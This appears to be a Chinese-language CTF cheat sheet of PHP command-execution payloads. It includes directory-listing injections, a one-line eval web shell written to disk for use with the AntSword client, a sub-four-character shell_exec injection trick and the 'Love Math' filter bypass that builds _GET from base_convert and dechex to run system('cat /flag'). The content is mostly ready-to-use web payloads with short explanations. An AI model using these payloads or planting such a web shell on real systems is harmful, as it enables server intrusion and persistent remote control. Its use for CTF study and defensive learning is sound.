## 文件执行

[TOC]



###### ?cmd=print_r(glob("*"));

打印文件目录

###### ?cmd=print_r(scandir("."));



###### file_put_contents('1.php','<?php eval($_POST["pass"]);?>');

很好用，直接蚁剑链接

###### nl,,,,,,最短的命令，不对<4

```
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<4){
     echo shell_exec($_GET[1]);
}
else{
     echo "hack!!!";
}
```

这是源码，命令的长度要小于4.

于是payload:

```
?1=>nl
?1=*
```

解释一下，第一个是在当前目录下创建一个nl文件夹。

第二个是 把第一个文件的名字（即nl）当中命令执行   ，  相当于执行nl命令

nl命令就是输出此目录下所有文件。

###### 数学函数

[buuctf-[CISCN 2019 初赛\]Love Math（小宇特详解）-CSDN博客](https://blog.csdn.net/xhy18634297976/article/details/123148026)

/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag



?c=($_GET[pi])($_GET[abs])&pi=system&abs=cat /flag

###### hex2bin() 函数

hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。

这里的`_GET`是ASCII 字符，用在线工具将`_GET`转换为十六进制

hex2bin=base_convert(37907361743,10,36)

然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数

dechex(1598506324)，1598506324转换为16进制就是5f 47 45 54